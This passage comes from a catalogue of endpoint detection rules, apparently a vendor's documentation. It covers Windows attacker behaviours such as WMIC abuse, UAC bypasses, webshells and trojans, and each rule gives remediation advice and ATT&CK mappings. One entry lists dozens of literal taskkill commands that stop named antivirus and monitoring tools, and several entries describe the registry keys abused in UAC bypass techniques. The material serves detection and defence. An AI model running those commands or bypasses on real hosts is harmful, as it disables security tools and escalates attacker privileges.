This detection identifies files from the Windows\Debug\ directory in command line arguments. This is a world-writable location used by attackers to store data.

#### Recommendation

Analyze the contents of the Windows\Debug directory. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003


</details>



<details>
<summary>Suspicious Process - Windows Graphics Component Elevation of Privilege Vulnerability</summary>



#### Description

This detection identifies possible use of a Microsoft DWM Core Library Elevation of Privilege Vulnerability, CVE-2021-26868,  which will allow a malicious actor to elevate privileges. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Privilege Escalation - T1068


</details>



<details>
<summary>Suspicious Process - Windows Installer Local Privilege Escalation</summary>



#### Description

This detection identifies possible use of CVE-2021-1727, a Windows Installer vulnerability that involves changing the value of the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Fax\ImagePath to an executable, which will then be executed with elevated permissions when MSIExec is run. 

#### Recommendation

Investigate the contents of the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Fax\ImagePath registry key. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Msiexec - T1218.007


</details>



<details>
<summary>Suspicious Process -  Winlogon\Userinit Registry Key Modification</summary>



#### Description

This detection identifies the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit registry key being modified via the command line. By modifying this key a malicious actor can cause arbitrary code to be executed when a user logs into the system. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. Investigate the file that has been added to the Winlogon\Userinit configuration. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Winlogon Helper DLL - T1547.004


</details>



<details>
<summary>Suspicious Process - WinRM Launches Shell</summary>



#### Description

WinRM is a utility that attackers can use to move laterally and execute code on other systems. This detects any instances of WinRM.exe launching PowerShell or Cmd.exe

#### Recommendation

Examine the commands being run by PowerShell of Cmd.exe. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Remote Management - T1021.006


</details>



<details>
<summary>Suspicious Process - WinVNC to Remote IP Address</summary>



#### Description

This detection identifies the VNC software WinVNC, also called UltraVNC, being used to connect to a remote IP address. Malicious actors may do this to establish communication with remote C2 infrastructure. 

#### Recommendation

Investigate the remote IP address being contacted and ensure there is a legitimate business use for it. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Suspicious Process - WMIC Creating PowerShell Process</summary>



#### Description

WMIC.exe, the command line utility for Windows Managent Instrumentation, has a number of functions that may be abused by an attacker. This detection identifies attempted creation of a PowerShell process by WMIC.

#### Recommendation

Analyze WMIC's command line arguments to determine if the command is expected behavior, or if it contains any suspicious indicators like obfuscated PowerShell commands. Investigate parent and child processes. 

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047


</details>



<details>
<summary>Suspicious Process - WMIC.exe With Format Flag And HTTP</summary>



#### Description

This detection identifies the use of WMIC.exe with the /format flag that is reaching out to another remote system over HTTP or SMB. This is often observed with XSL files containing malicious code. 

#### Recommendation

Analyze the contents of any XSL files that appear in the command line arguments. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047


</details>



<details>
<summary>Suspicious Process - WMIC Launching MSHTA Process</summary>



#### Description

This detection identifies the WMIC utility launching MSHTA. A malicious actors may use WMIC to run content from an HTML file using MSHTA. 

#### Recommendation

Investigate the contents of the command or file being run. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - WMIC Launching Remote Process</summary>



#### Description

This detection identifies WMIC being used to run commands on a remote system. Malicious actors may do this for lateral movement purposes. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047


</details>



<details>
<summary>Suspicious Process - Wmic Launching RunDll32</summary>



#### Description

This detection identifies RunDLL32 being launched by WMIC. This may be done by malicious actors to execute code on a remote system by using the /node argument of WMIC. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - WMIPrvSe Executes ScriptRunner</summary>



#### Description

This detection identifies Windows Management Instrumentation (WMI) being used to execute ScriptRunner. ScriptRunner is a Windows utility that will run any script with a known file association on the system. Malicious actors may use this to break up the chain of execution so that PowerShell, for example, is not seen being directly executed by WMIPrvSe, which is a common tactic that defenders know to look for. 

#### Recommendation

Examine the script executed by ScriptRunner and any other processes started by WMIPrvSe around this timeframe. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- PowerShell - T1059.001
- Windows Command Shell - T1059.003


</details>



<details>
<summary>Suspicious Process - WMIPrvSe Spawns Cmstp  </summary>



#### Description

This detection identifies WMI calls being used to spawn CMSTP.exe. CMSTP, the Microsoft Connection Manager Profile Installer, can be used to proxy the execution of an untrusted executable.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- CMSTP - T1218.003


</details>



<details>
<summary>Suspicious Process - WMIPrvSe Spawns RunDLL32</summary>



#### Description

This detection identifies 'rundll32.exe' being spawned by 'wmiprvse.exe'. This technique is used by various remote code execution tools that are used by malicious actors and penetration testers to perform the execution of malicious DLL files.

#### Recommendation

Investigate the DLL being passed to 'rundll32.exe' to determine if it is malicious. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- Signed Binary Proxy Execution - T1218
- Rundll32 - T1218.011


</details>



<details>
<summary>Suspicious Process - WMI Queries Passed To PowerShell</summary>



#### Description

This detection identifies Windows Management Instrumentation (WMI) queries being passed to 'PowerShell.exe' and the command output to a file being redirected. This technique is used by malicious actors to gather information about the target endpoint to return to the command and control server.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- PowerShell - T1059.001
- System Information Discovery - T1082


</details>



<details>
<summary>Suspicious Process - Word or Excel Spawns RunDLL32</summary>



#### Description

This detection identifies Microsoft Word spawning ‘RunDLL32.exe’. This may be done by malicious documents to run malicious DLL files.

#### Recommendation

Determine what document was opened by the user that may have caused this behavior. Investigate the document for potential malicious macros. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Suspicious Process - WordPad Using /p Flag With DLL</summary>



#### Description

This detection identifies WordPad with the /p flag executing with a DLL as the target. This has been observed in ransomware activity. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Suspicious Process - Word Spawns ForFiles</summary>



#### Description

This detection identifies ‘ForFiles.exe' being spawned as a child process of 'Word.exe'. Malicious actors send malicious documents to targets that retrieve and execute malware from external locations when opened.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Indirect Command Execution - T1202


</details>



<details>
<summary>Suspicious Process - WScript, CScript, MSHTA Launching CSC</summary>



#### Description

Identifies CSC, the Microsoft Visual C# compiler, being executed by WScript, CScript, or MSHTA. This is often done by malware that compiles at runtime.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Compile After Delivery - T1027.004
- Command and Scripting Interpreter - T1059
- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - Wscript  //e:VBScript</summary>



#### Description

This detection identifies suspicious vbscript files being run with the wscript //e:VBScript command.

#### Recommendation

Analyze the contents of the VBScript being run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Visual Basic - T1059.005


</details>



<details>
<summary>Suspicious Process - WScript or CScript Running Executable From Templates Directory</summary>



#### Description

This detection identifies WScript.exe or CScript.exe being used to run an executable from the Templates directory. The Templates directory is a common staging location for malicious actors. 

#### Recommendation

Examine the contents of the script being run, and any other contents of the Templates directory. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003


</details>



<details>
<summary>Suspicious Process - WScript Runs JavaScript File from Temp Or Download Directory</summary>



#### Description

This detection identifies a JavaScript file being run from a Temp or Download directory. This may indicate execution of a malicious JavaScript file downloaded via web browser or other application.

#### Recommendation

Analyze the contents of the JavaScript being run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - WScript.Shell Passed To MSHTA</summary>



#### Description

This detection identifies the ‘WScript.Shell’ being passed to ‘mshta.exe’. This technique is used by malicious actors to execute scripts, and is associated with the Kovter family of fileless malware.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Visual Basic - T1059.005
- JavaScript - T1059.007
- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - WScript Starts File From Within Archive</summary>



#### Description

This detection identifies Wscript running an HTML Application (.mht) file from within a Zip archive. Delivering a .mht file within an archive is a technique used by malicious actors to deliver malicious documents to targets via email attachments.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Visual Basic - T1059.005
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Suspicious Process - WSO2 Product Launches Suspicious Process</summary>



#### Description

This detection identifies suspicious processes launched by a WSO2 product process, which may be indicative of exploitation of CVE-2022-29464. CVE-2022-29464 is an unrestricted arbitrary file upload vulnerability which can lead to remote code execution. Rapid7 has observed this CVE being actively exploited in the wild. 

Additional information can be found on our blog: https://www.rapid7.com/blog/post/2022/04/22/opportunistic-exploitation-of-wso2-cve-2022-29464/



#### Recommendation

Investigate any .jsp or .war files created around the time of this activity, they may be web shells. 

Additional information and remediation steps can be found in WSO2's advisory, https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738

#### MITRE ATT&CK Techniques

- Exploit Public-Facing Application - T1190
- Exploitation for Client Execution - T1203


</details>



<details>
<summary>Suspicious Process - Wsus.exe</summary>



#### Description

This detection identifies executables named 'wsus.exe'. Malware has been observed using the name 'wsus.exe' in an attempt to evade detection, as 'wsus.exe' is reminiscent of executables used by the Windows Server Update Service.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - Wuauclt.exe Execution With No Arguments</summary>



#### Description

 This detection identifies suspicious wuauclt.exe process launching without standard argument. Malicious actors have been observed with this activity associated with Process Injection and deploying Cobalt Strike.

#### Recommendation

 Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - Wusa.exe Execution With No Arguments</summary>



#### Description

This detection identifies suspicious wusa.exe process launching without standard argument. Malicious actors have been observed with this activity associated with Process Injection and deploying Cobalt Strike.

#### Recommendation

 Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055


</details>



<details>
<summary>Suspicious Process - xCmd Utility</summary>



#### Description

This detection identifies the use of xCmd, a tool similar to PsExec that allows the execution of processes on remote systems. Like PsExec, this utility can be abused by malicious actors for lateral movement and execution. 

#### Recommendation

Inspect the activity and determine whether it is being performed by an authorized user performing admin activities. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Service Execution - T1569.002


</details>



<details>
<summary>Suspicious Process - XORed Data in PowerShell</summary>



#### Description

This detection identifies PowerShell being used to perform a bitwise XOR operation on a piece of data. Malicious actors will often use XOR strings or other data to obfuscate their content. 

#### Recommendation

If the key used to XOR the data is available from context, consider using it to deobfuscate the command. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Data Obfuscation - T1001
- Deobfuscate/Decode Files or Information - T1140


</details>



<details>
<summary>Suspicious Process - XWizard.exe Downloading File</summary>



#### Description

This detection identifies the utility XWizard.exe being used to download a file. Malicious actors may use this over other download methods to evade detection. 

#### Recommendation

Investigate the contents of the URL being contacted and the file being downloaded. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105
- User Execution - T1204


</details>



<details>
<summary>Suspicious Process - Zoho ManageEngine Spawns Child</summary>



#### Description

This detection identifies suspicious child processes of the Zoho ManageEngine Desktop Central or ASSelfService software. This may be indicative of a malicious actor exploiting one of several known remote code execution vulnerabilities in ManageEngine products. Rapid7 has identified in-the-wild exploitation of CVE-2020-10189 for Desktop Central and CVE-2022-28810 for ADSelfService. 

Additional information on these vulnerabilities can be found here:
https://attackerkb.com/topics/cve-2020-10189
https://attackerkb.com/topics/cve-2022-28810

#### Recommendation

Investigate any processes spawned by ManageEngine, and any processes that those processes may have spawned. Ensure that all ManageEngine products are updated to the latest available version to mitigate vulnerabilities. 

#### MITRE ATT&CK Techniques

- Exploitation for Client Execution - T1203


</details>



<details>
<summary>Suspicious Scheduled Task - Created By Scripting Engine</summary>



#### Description

This detection identifies scheduled tasks being created by a scripting engine, such as cmd.exe or PowerShell. This is often observed in use by malicious actors to execute code and maintain persistence. 


#### Recommendation

Review the contents of the task being scheduled. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005
- Command and Scripting Interpreter - T1059


</details>



<details>
<summary>Suspicious Scheduled Task - TaskEng Spawns Or Uses File From Users Temp Folder</summary>



#### Description

This detection identifies processes being spawned by TaskEng.exe from the user's temp directory. This may be indicative of a malicious actor using scheduled tasks for execution and persistence. 

#### Recommendation

Review the scheduled tasks on the system for any suspicious tasks. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task - T1053.005


</details>



<details>
<summary>System Discovery - WMIC Listing Processes</summary>



#### Description

This detection identifies the 'wmic.exe' utility being used to list the running processes or installed programs on a host. Malicious actors may do this to determine what kind of security products are installed, or if there are any installed applications that may make good targets for data theft. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- System Information Discovery - T1082
- Software Discovery - T1518


</details>



<details>
<summary>Test - Rapid7 InsightAgent Test</summary>



#### Description

This detection is a test rule for Rapid7 that looks for the string 'Rapid7InsightAgentTest' in the commandline of any process start event.

#### Recommendation

There is no recommendation for this test rule.

</details>



<details>
<summary>Trojan - 8 Digit Batch File In Temp</summary>



#### Description

This detection identifies batch files with a name made up of 8 digits being run from the Temp directory. This pattern has been observed in use by malicious actors, notably the Pony loader. 

#### Recommendation

Examine the contents of the batch script. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003


</details>



<details>
<summary>Trojan - Emotet Known Filename</summary>



#### Description

This detection identifies binary names commonly used by Emotet. 

#### Recommendation

Analyze the binary being executed. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

</details>



<details>
<summary>Trojan - Firewall Rule Added For Program With All Protocols Allowed</summary>



#### Description

This detection identifies firewall rules being added that allow all protocols. This has been observed in use by malicious actors who want to allow inbound traffic for c2 purposes.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify System Firewall - T1562.004


</details>



<details>
<summary>Trojan - Java Spawns TaskKill</summary>



#### Description

This detection identifies a Java applet killing processes using TaskKill. Malicious actors may use TaskKill to stop any security software running on a system. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Trojan - QakBot</summary>



#### Description

This detection identifies commands matching the behavior of QakBot. The dropper will overwrite its original location with a copy of calc.exe using the "type" command.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003


</details>



<details>
<summary>Trojan - Suspicious VBS File Run from AppData\Local\Temp</summary>



#### Description

This detection identifies Visual Basic scripts being run from the AppData\Local\Temp directory, a common staging directory for malicious actors.

#### Recommendation

Review the contents of the script being run. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003
- Visual Basic - T1059.005


</details>



<details>
<summary>Trojan - TaskKill Security Tools</summary>



#### Description

This detection identifies the TaskKill utility being used to stop various security tools. 

Examples:
taskkill /IM Taskmgr.exe /T /F
taskkill /IM MSASCui.exe /T /F
taskkill /IM wireshark.exe /T /F
taskkill /IM capinfos.exe /T /F
taskkill /IM mbam.exe /T /F
taskkill /IM V3Medic.exe /T /F
taskkill /IM BullGuarScanner.exe /T /F
taskkill /IM ClamTray.exe /T /F
taskkill /IM TRAYSSER.EXE /T /F
taskkill /IM TRAYICOS.EXE /T /F
taskkill /IM VIEWTCP.EXE /T /F
taskkill /IM fshoster32.exe /T /F
taskkill /IM FSM32.EXE /T /F
taskkill /IM AVK.exe /T /F
taskkill /IM GdBgInx64.exe /T /F
taskkill /IM AVKProxy.exe /T /F
taskkill /IM AVKWCtlx64.exe /T /F
taskkill /IM K7TSMngr.exe /T /F
taskkill /IM BDSSVC.EXE /T /F
taskkill /IM QUHLPSVC.EXE /T /F
taskkill /IM ScSecSvc.exe /T /F
taskkill /IM SSUpdate64.exe /T /F
taskkill /IM K7EmlPxy.EXE /T /F
taskkill /IM uiWinMgr.exe /T /F
taskkill /IM uiWatchDog.exe /T /F
taskkill /IM SBAMSvc.exe /T /F
taskkill /IM SBPIMSvc.exe /T /F
taskkill /IM Bav.exe /T /F
taskkill /IM MCShieldDS.exe /T /F
taskkill /IM SDFSSvc.exe /T /F
taskkill /IM UnThreat.exe /T /F
taskkill /IM FortiSSLVPNdaemon.exe /T /F
taskkill /IM FilMsg.exe /T /F
taskkill /IM psview.exe /T /F
taskkill /IM schmgr.exe /T /F

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Trojan - Users Process Spawns SVCHost</summary>



#### Description

This detection identifies a process running from the Users directory spawning a process named SVCHost. This behavior has been observed in several malware families, notably Vawtrak/Neverquest/Ursnif. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Trojan - Vawtrak - Spawns Control.exe With /?</summary>



#### Description

This detection identifies control.exe spawning with /? as an argument. This has been observed in the Vawtrak/Ursnif/Neverquest malware family. 


#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>UAC Bypass - Custom WScript Manifest</summary>



#### Description

This detection identifies WScript being used with a custom manifest. The WScript.exe binary does not have an embedded manifest. Attackers can abuse this by dropping a custom manifest and loading it with WScript, which can then run scripts with elevated privileges.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002


</details>



<details>
<summary>UAC Bypass - Disk Cleanup Scheduled Task</summary>



#### Description

This detection identifies a possible UAC bypass using the Disk Cleanup scheduled task. A vulnerability in some versions of Windows 10 allows a scheduled task running the Windows Disk Cleanup utility to execute malicious code by modifying the content of an environment variable.


#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002


</details>



<details>
<summary>UAC Bypass - DLL Load Order Hijacking</summary>



#### Description

This detection identifies possible instances of DLL load order hijacking. A DLL hijacking vulnerability can allow attackers to use a number of legitimate executables to load a malicious DLL and elevate their privileges. Windows binaries with the "auto-elevate" property will automatically run with elevated privileges, and any code that they execute will inherit those privileges. An attacker can abuse this by inserting a crafted DLL into the search path of a binary. Upon executing, that binary will load the malicious DLL, rather than the actual DLL that it is looking for, and the attacker's code will be executed with elevated privileges.

#### Recommendation

The parent process will be the auto-elevating Windows binary. Any unusual processes spawned by those binaries may have been executed by an attacker to elevate their privileges. Investigate the executed process to determine whether it is expected behavior. Signs of unexpected behavior may include processes run out of unusual directories, such as a user's directory, or cmd.exe/PowerShell processes with arguments that contain IP addresses or domain names, or lengthy base64-encoded strings.

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002
- DLL Search Order Hijacking - T1574.001


</details>



<details>
<summary>UAC Bypass -  Eventvwr.exe</summary>



#### Description

This detection identifies a possible UAC bypass using 'eventvwr.exe'.An attacker can modify the HKCU\Software\Classes\mscfile\shell\open\command registry key so that, when the Windows Event Viewer is opened, an executable of their choosing is run with elevated privileges.

#### Recommendation

Review the process being executed by 'eventvwr.exe', and ensure that the contents of the HKCU\Software\Classes\mscfile\shell\open\command and HKCR\Software\Classes\mscfile\shell\open\command keys are set to their intended value of mmc.exe

#### MITRE ATT&CK Techniques

- Modify Registry - T1112
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>UAC Bypass - fodhelper.exe </summary>



#### Description

This detection identifies a possible UAC bypass technique using 'fodhelper.exe'. In Windows 10 an attacker can set the values of HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute and 
HKCU:\Software\Classes\ms-settings\shell\open\command\(default), causing fodhelper.exe to execute code with higher privileges and bypass UAC.

#### Recommendation

Determine what fodhelper.exe is launching and, if possible, the contents of HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute and HKCU:\Software\Classes\ms-settings\shell\open\command\(default)

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002


</details>



<details>
<summary>UAC Bypass - MMC Launching Notepad</summary>



#### Description

This detection identifies a possible UAC bypass technique using 'mmc.exe' and Notepad. Several Windows Management Console snap-ins spawn as high-integrity processes without a UAC prompt. An attacker with GUI access can abuse this by opening the snap-in, navigating to the help menu, right-clicking the help text and clicking View Source. This will open the source in a high-integrity Notepad process. From there, the attacker can use Notepad to open 'cmd.exe'.

#### Recommendation

Determine whether using the Management Console is expected behavior for this user. Investigate whether any further processes were spawned from the elevated Notepad process. 

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002


</details>



<details>
<summary>UAC Bypass - Notepad Launching CMD or PowerShell</summary>



#### Description

This detection identifies a possible UAC bypass technique using Notepad. Several Windows Management Console snap-ins spawn as high-integrity processes without a UAC prompt. An attacker with GUI access can abuse this by opening the snap-in, navigating to the help menu, right-clicking the help text and clicking View Source. This will open the source in a high-integrity Notepad process. From there, the attacker can use Notepad to open cmd.exe or PowerShell, gaining an elevated shell.

#### Recommendation

Examine the commands run by the child process of Notepad. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Bypass User Account Control - T1548.002


</details>



<details>
<summary>User Discovery - WMIC UserAccount List</summary>



#### Description

This detection identifies the use of wmic.exe in order to enumerate the users on the system

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- System Owner/User Discovery - T1033


</details>



<details>
<summary>Webshell - China Chopper Executing Commands</summary>



#### Description

The detection identifies commands that are observed when the China Chopper webshell executes commands on a host. China Chopper is a simple webshell often deployed by malicious actors post-compromise.  

#### Recommendation

Investigate web directories for any unknown files. If necessary, rebuild the host from a known, good source and have users change their passwords.


#### MITRE ATT&CK Techniques

- Web Shell - T1505.003


</details>



<details>
<summary>Webshell - Commands Launched by Webserver</summary>



#### Description

Identifies suspicious host recon commands launched by webserver processes. This may be indicative of a web shell. 

#### Recommendation

Examine any process that may have spawned by the webserver process. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- System Information Discovery - T1082
- Web Shell - T1505.003


</details>



<details>
<summary>Webshell - IIS Spawns CertUtil</summary>



#### Description

This detection identifies the execution of a suspicious webshell that spawns certutil.exe to download additional files. Threat actors can use this method by abusing a vulnerability in the wild.

#### Recommendation

Review the webshell and related process activity in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003


</details>



<details>
<summary>Webshell - IIS Spawns CMD To Spawn PowerShell</summary>



#### Description

This detection identifies Microsoft's Internet Information Server (IIS) web server 'w3wp.exe' spawning 'cmd.exe' and passing 'powershell' to the command line of the newly spawned process. This tactic is used by malicious actors during the web server exploitation to execute malicious scripts.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Web Shell - T1505.003


</details>



<details>
<summary>Webshell - IIS Spawns PowerShell</summary>



#### Description

This detection identifies instances of PowerShell spawned by the Microsoft Internet Information Server (IIS) process, ‘w3wp.exe’. This behavior is indicative of possible webshell activity.

#### Recommendation

Review the commands being executed by the web server to see if it is consistent with malicious activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Web Shell - T1505.003


</details>
